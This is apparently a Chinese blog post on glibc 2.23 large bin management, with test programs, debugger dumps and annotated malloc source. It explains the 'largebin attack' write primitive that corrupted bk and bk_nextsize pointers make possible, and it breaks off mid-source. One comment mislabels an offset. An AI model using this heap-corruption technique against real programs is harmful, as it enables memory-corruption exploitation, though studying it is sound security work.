<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS             128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NSMALLBINS         64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br></pre></td></tr></table></figure>

<p>这是glibc中的宏定义，可以计算出：</p>
<ul>
<li>在64位程序下：MIN_LARGE_SIZE &#x3D; 64*0x10 &#x3D; 0x400;</li>
<li>在32位程序下：MIN_LARGE_SIZE &#x3D; 64*0x8 &#x3D; 0x200;</li>
</ul>
<p>大于MIN_LARGE_SIZE的chunk为large bin。</p>
<p><strong>largebin是如何管理的呢？</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_64(sz)                                                \</span></span><br><span class="line"><span class="meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="string">&lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span></span><br><span class="line"><span class="meta">   126)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index(sz) \</span></span><br><span class="line"><span class="meta">  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \</span></span><br><span class="line"><span class="meta">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \</span></span><br><span class="line"><span class="meta">   : largebin_index_32 (sz))</span></span><br></pre></td></tr></table></figure>

<p>这是glibc2.23源码1500行处</p>
<p>我们知道，fastbin有一个index，然后对应大小的bin放到对应index的bins里，largebin也类似，当一个bin被放入largebin时，首先根据size计算其对应的index，我们将0x400带入<code> 48 + (0x400 &gt;&gt; 6) = 64</code>，0x400~0x430带入largebin_index(sz)宏函数中计算后都是64，继续计算的话可以发现<strong>largebin中是在一个范围内chunk都属于同一个bin或index</strong>，因此以此类推，我们可以得到如下分布图：</p>
<p><img data-src="/../images/image-20250327153800287.png" alt="image-20250327153800287"></p>
<p><strong>我们知道了large bin是靠桶来管理不同index的chunk，不同index的chunk之间没有联系，那么在同一个index桶里，chunk之间有什么联系吗？</strong></p>
<p>Fd_nextsize指向比自己小的chunk，fd_bknextsize指向比自己大的chunk，最后一个chunk的fd_nextsize指向最后一个chunk，形成了<strong>双向链表</strong>，如下图：</p>
<p><img data-src="/../images/image-20250327161114374.png" alt="image-20250327161114374"></p>
<p><strong>假如多个一样大小的chunk怎么管理？</strong></p>
<p><img data-src="/../images/image-20250327162735558.png" alt="image-20250327162735558"></p>
<h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><h3 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h3><p>这个目的是了解<strong>同index不同大小的chunk</strong>的关系，和与libc_arena的关系</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">char</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span> - <span class="number">0x10</span>);<span class="comment">//0x400</span></span><br><span class="line">   <span class="type">char</span> *gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//gap</span></span><br><span class="line">   <span class="type">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x410</span> - <span class="number">0x10</span>);<span class="comment">//0x410</span></span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x420</span> - <span class="number">0x10</span>);<span class="comment">//0x420</span></span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="built_in">free</span>(p1);</span><br><span class="line">   <span class="built_in">free</span>(p2);</span><br><span class="line">   <span class="built_in">free</span>(p3);</span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x500</span>);<span class="comment">//这里再申请一个是触发便利unsortedbin，使对应的chunk放入largebins中</span></span><br><span class="line">   read(<span class="number">0</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">&#125;gcc -o test1 test1.c -g</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">empty</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x400-0x430: 0x602850 —▸ 0x602420 —▸ 0x602000 —▸ 0x7ffff7dd1f68 (main_arena+1096) ◂— 0x602850 /* <span class="string">&#x27;P(`&#x27;</span> */</span><br><span class="line">pwndbg&gt; x/20gx 0x7ffff7dd1f68</span><br><span class="line">0x7ffff7dd1f68 &lt;main_arena+1096&gt;:       0x00007ffff7dd1f58      0x00007ffff7dd1f58</span><br><span class="line">0x7ffff7dd1f78 &lt;main_arena+1112&gt;:       0x0000000000602850      0x0000000000602000</span><br><span class="line">    					<span class="comment"># 这个指向在当前index下最大那一组的头节点	这个指向在当前index下最小那一组的头节点</span></span><br><span class="line">0x7ffff7dd1f88 &lt;main_arena+1128&gt;:       0x00007ffff7dd1f78      0x00007ffff7dd1f78</span><br><span class="line">0x7ffff7dd1f98 &lt;main_arena+1144&gt;:       0x00007ffff7dd1f88      0x00007ffff7dd1f88</span><br><span class="line">0x7ffff7dd1fa8 &lt;main_arena+1160&gt;:       0x00007ffff7dd1f98      0x00007ffff7dd1f98</span><br><span class="line">0x7ffff7dd1fb8 &lt;main_arena+1176&gt;:       0x00007ffff7dd1fa8      0x00007ffff7dd1fa8</span><br><span class="line">0x7ffff7dd1fc8 &lt;main_arena+1192&gt;:       0x00007ffff7dd1fb8      0x00007ffff7dd1fb8</span><br><span class="line">0x7ffff7dd1fd8 &lt;main_arena+1208&gt;:       0x00007ffff7dd1fc8      0x00007ffff7dd1fc8</span><br><span class="line">0x7ffff7dd1fe8 &lt;main_arena+1224&gt;:       0x00007ffff7dd1fd8      0x00007ffff7dd1fd8</span><br><span class="line">0x7ffff7dd1ff8 &lt;main_arena+1240&gt;:       0x00007ffff7dd1fe8      0x00007ffff7dd1fe8</span><br><span class="line">pwndbg&gt; x/10gx 0x0000000000602850</span><br><span class="line">0x602850:       0x0000000000000000      0x0000000000000421</span><br><span class="line">0x602860:       0x0000000000602420      0x00007ffff7dd1f68#bk</span><br><span class="line">0x602870:       0x0000000000602420      0x0000000000602000</span><br><span class="line">0x602880:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602890:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/10gx 0x602000</span><br><span class="line">0x602000:       0x0000000000000000      0x0000000000000401#chunk A</span><br><span class="line">0x602010:       0x00007ffff7dd1f68      0x0000000000602420</span><br><span class="line">0x602020:       0x0000000000602850      0x0000000000602420#fd_nextsize --&gt; chunk C prev_size</span><br><span class="line">0x602030:       0x0000000000000000      0x0000000000000000#bk_nextsize --&gt; chunk B prev_size</span><br><span class="line">0x602040:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x602420</span><br><span class="line">0x602420:       0x0000000000000000      0x0000000000000411#chunk B</span><br><span class="line">0x602430:       0x0000000000602000      0x0000000000602850</span><br><span class="line">0x602440:       0x0000000000602000      0x0000000000602850</span><br><span class="line">0x602450:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602460:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x602850</span><br><span class="line">0x602850:       0x0000000000000000      0x0000000000000421#chunk C</span><br><span class="line">0x602860:       0x0000000000602420      0x00007ffff7dd1f68</span><br><span class="line">0x602870:       0x0000000000602420      0x0000000000602000</span><br><span class="line">0x602880:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602890:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<h3 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h3><p>这个目的是了解<strong>同index相同大小的chun</strong>k**的关系，和与libc_arena的关系</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">char</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span> - <span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//gap</span></span><br><span class="line">   <span class="type">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span> - <span class="number">0x10</span>);</span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span> - <span class="number">0x10</span>);</span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="built_in">free</span>(p1);</span><br><span class="line">   <span class="built_in">free</span>(p2);</span><br><span class="line">   <span class="built_in">free</span>(p3);</span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">   read(<span class="number">0</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -o test2 test2.c </span></span><br><span class="line"><span class="comment">//read的作用是阻塞程序执行，./test2 ,ps -a 看pid, gdb ,attach pid</span></span><br></pre></td></tr></table></figure>

<p>gdb调试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">empty</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x400-0x430: 0x602000 —▸ 0x602840 —▸ 0x602420 —▸ 0x7ffff7dd1f68 (main_arena+1096) ◂— 0x602000</span><br><span class="line">pwndbg&gt; x/20gx 0x7ffff7dd1f68</span><br><span class="line">0x7ffff7dd1f68 &lt;main_arena+1096&gt;:       0x00007ffff7dd1f58      0x00007ffff7dd1f58</span><br><span class="line">0x7ffff7dd1f78 &lt;main_arena+1112&gt;:       0x0000000000602000      0x0000000000602420</span><br><span class="line">0x7ffff7dd1f88 &lt;main_arena+1128&gt;:       0x00007ffff7dd1f78      0x00007ffff7dd1f78</span><br><span class="line">0x7ffff7dd1f98 &lt;main_arena+1144&gt;:       0x00007ffff7dd1f88      0x00007ffff7dd1f88</span><br><span class="line">0x7ffff7dd1fa8 &lt;main_arena+1160&gt;:       0x00007ffff7dd1f98      0x00007ffff7dd1f98</span><br><span class="line">0x7ffff7dd1fb8 &lt;main_arena+1176&gt;:       0x00007ffff7dd1fa8      0x00007ffff7dd1fa8</span><br><span class="line">0x7ffff7dd1fc8 &lt;main_arena+1192&gt;:       0x00007ffff7dd1fb8      0x00007ffff7dd1fb8</span><br><span class="line">0x7ffff7dd1fd8 &lt;main_arena+1208&gt;:       0x00007ffff7dd1fc8      0x00007ffff7dd1fc8</span><br><span class="line">0x7ffff7dd1fe8 &lt;main_arena+1224&gt;:       0x00007ffff7dd1fd8      0x00007ffff7dd1fd8</span><br><span class="line">0x7ffff7dd1ff8 &lt;main_arena+1240&gt;:       0x00007ffff7dd1fe8      0x00007ffff7dd1fe8</span><br><span class="line">pwndbg&gt; x/10gx 0x0000000000602000</span><br><span class="line">0x602000:       0x0000000000000000      0x0000000000000401</span><br><span class="line">0x602010:       0x0000000000602840      0x00007ffff7dd1f68</span><br><span class="line">0x602020:       0x0000000000602000      0x0000000000602000</span><br><span class="line"><span class="comment">#在相同index下没有其它大小的chunk，指向自身</span></span><br><span class="line">0x602030:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602040:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x0000000000602840</span><br><span class="line">0x602840:       0x0000000000000000      0x0000000000000401</span><br><span class="line">0x602850:       0x0000000000602420      0x0000000000602000</span><br><span class="line">0x602860:       0x0000000000000000      0x0000000000000000</span><br><span class="line"><span class="comment">#同样大小下除了头节点，其他的fd_nextsize和bk_nextsize为0</span></span><br><span class="line">0x602870:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602880:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x0000000000602420</span><br><span class="line">0x602420:       0x0000000000000000      0x0000000000000401</span><br><span class="line">0x602430:       0x00007ffff7dd1f68      0x0000000000602840</span><br><span class="line">0x602440:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602450:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602460:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt;    </span><br></pre></td></tr></table></figure>

<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>从源码分析largebin_attack</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size) &#123;</span><br><span class="line">    <span class="comment">// 判断当前操作的chunk的size是不是等于largebin中最大的size</span></span><br><span class="line">    <span class="comment">/* Always insert in the second position. */</span></span><br><span class="line">    fwd = fwd-&gt;fd;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 这是largebin_attack的核心</span></span><br><span class="line">    victim-&gt;fd_nextsize = fwd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<span class="comment">//##//addr2</span></span><br><span class="line">    fwd-&gt;bk_nextsize = victim;</span><br><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="comment">//##//addr2-&gt;fd_nextsize = victim</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bck = fwd-&gt;bk;<span class="comment">//##//addr1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (victim-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mark_bin(av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;<span class="comment">//##//addr2-&gt;fd = victim</span></span><br></pre></td></tr></table></figure>

<p>这是glibc2.23中3700行左右的代码，加<code>//##//</code>的是largebin_attack的核心</p>
<p>该段代码是从unsorted bin里取出未归位的large bin时可能会触发的代码。什么叫未归位？当free一个块时，如果chunk没有放到fastbin或者tcache，那么就直接放到unsorted bin里。当接下来malloc符合某些条件时，会遍历unsorted bin，并根据chunk的size把chunk给放到对应的bin里，比如放到large bin、small bin等。</p>
<p>fwd指向的是large bin的某个头结点，而victim指向的是unsorted bin里当前遍历到的这个chunk。</p>
<p>先不考虑前面的条件，假设程序执行到此处，而我们利用UAF或其他漏洞<strong>控制了fwd的bk和bk_nexsize指针分别为addr1、addr2</strong>，那么，我们代入图中计算，得：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">addr2-&gt;fd_nexsize = victim <span class="comment">//向addr2+0x18处写入victim的地址</span></span><br><span class="line">addr1-&gt;fd = victim <span class="comment">//向addr2+0x10处写入victim的地址</span></span><br></pre></td></tr></table></figure>

<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><strong>最终实现：往任意地址处写入一个堆地址（或一个大数）</strong></p>
<p><strong>那么怎么到达这里触发这些代码呢？</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx;                 <span class="comment">/* associated bin index */</span></span><br><span class="line">  mbinptr bin;                      <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line">  <span class="type">int</span> victim_index;                 <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;              <span class="comment">/* remainder from a split */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> remainder_size;     <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Convert request size to internal form by adding SIZE_SZ bytes</span></span><br><span class="line"><span class="comment">     overhead plus possibly more to obtain necessary alignment and/or</span></span><br><span class="line"><span class="comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span></span><br><span class="line"><span class="comment">     size. Also, checked_request2size traps (returning 0) request sizes</span></span><br><span class="line"><span class="comment">     that are so large that they wrap around zero when padded and</span></span><br><span class="line"><span class="comment">     aligned.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">     mmap.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">	alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">     This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">     can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">//这个 (nb) 是我们申请的大小，判断是不是在fastbin中，直接跳过</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp = *fb;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          victim = pp;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">             != victim);</span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">            errout:</span><br><span class="line">              malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          check_remalloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"><span class="comment">//这里如果符合smallbin执行，也跳过</span></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              bck = victim-&gt;bk;</span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">                &#123;</span><br><span class="line">                  errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">              set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">     While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">     even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">     fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">     Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">     large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">     invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">     it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Process recently freed or remaindered chunks, taking one only if</span></span><br><span class="line"><span class="comment">     it is exact fit, or, if this a small request, the chunk is remainder from</span></span><br><span class="line"><span class="comment">     the most recent non-exact fit.  Place other traversed chunks in</span></span><br><span class="line"><span class="comment">     bins.  Note that this step is the only place in any routine where</span></span><br><span class="line"><span class="comment">     chunks are placed in bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The outer loop here is needed because we might not realize until</span></span><br><span class="line"><span class="comment">     near the end of malloc that we should have consolidated, so must</span></span><br><span class="line"><span class="comment">     do so and retry. This happens at most once, and only when we would</span></span><br><span class="line"><span class="comment">     otherwise need to expand memory to service a &quot;small&quot; request.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"><span class="comment">//这里是关于largebin_attack的重点</span></span><br><span class="line">  <span class="keyword">for</span> (;; )<span class="comment">//遍历unsortedbin</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<span class="comment">//从bk开始遍历</span></span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);<span class="comment">//获得当前要操作的chunk的size</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"><span class="comment">//判断smallbin，跳过</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          